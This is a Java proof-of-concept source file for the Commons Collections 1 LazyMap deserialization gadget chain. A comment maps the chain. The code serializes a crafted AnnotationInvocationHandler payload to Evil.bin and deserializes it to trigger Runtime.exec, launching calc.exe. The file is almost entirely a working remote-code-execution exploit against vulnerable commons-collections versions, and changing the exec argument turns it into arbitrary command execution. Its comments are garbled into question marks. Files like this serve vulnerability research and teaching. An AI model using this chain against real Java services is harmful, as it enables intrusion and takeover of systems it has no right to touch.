package com.CommonsCollections;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;
import java.io.*;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.Proxy;
import java.util.HashMap;
import java.util.Map;

/**
 * Gadget chain:
 * ObjectInputStream.readObject()
 * 		AnnotationInvocationHandler.readObject()
 * 			Map(Proxy).entrySet()
 * 				AnnotationInvocationHandler.invoke()
 * 					LazyMap.get()
 * 						ChainedTransformer.transform()
 * 							ConstantTransformer.transform()
 * 							InvokerTransformer.transform()
 * 								Method.invoke()
 * 									Class.getMethod()
 * 							InvokerTransformer.transform()
 * 								Method.invoke()
 * 									Runtime.getRuntime()
 * 							InvokerTransformer.transform()
 * 								Method.invoke()
 * 									Runtime.exec()
 *
 * 	Requires:
 * 		commons-collections:3.1-3.2.1
 * 	    JDK: 1.7
 */

public class CC1_LazyMap {
    public static void main(String[] args) throws Exception {
        String[] execArgs = new String[]{"calc.exe"};
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", new Class[0]}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, new Object[0]}),
                new InvokerTransformer("exec", new Class[]{String.class}, execArgs)});
        HashMap innermap = new HashMap();
        LazyMap map = (LazyMap) LazyMap.decorate(innermap, chain);

        Constructor<?> handler_constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        handler_constructor.setAccessible(true);
        // ???????????????????????????LazyMap????????????????????????
        InvocationHandler map_handler = (InvocationHandler) handler_constructor.newInstance(Override.class, map);
        // ??????????????????proxy_map?????????map_handler??????????????????????????????????????????????????????????????????????????????AnnotationInvocationHandler?????????????????????????????????invoke??????
        Map proxy_map = (Map) Proxy.newProxyInstance(ClassLoader.getSystemClassLoader(), new Class[]{Map.class}, map_handler);
        Constructor<?> AnnotationInvocationHandler_Constructor = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler").getDeclaredConstructor(Class.class, Map.class);
        AnnotationInvocationHandler_Constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) AnnotationInvocationHandler_Constructor.newInstance(Override.class, proxy_map);

        //payload?????????????????????
        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("Evil.bin"));
        outputStream.writeObject(handler);
        outputStream.close();
        //?????????????????????????????????????????????????????????
        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("Evil.bin"));
        inputStream.readObject();
    }


}
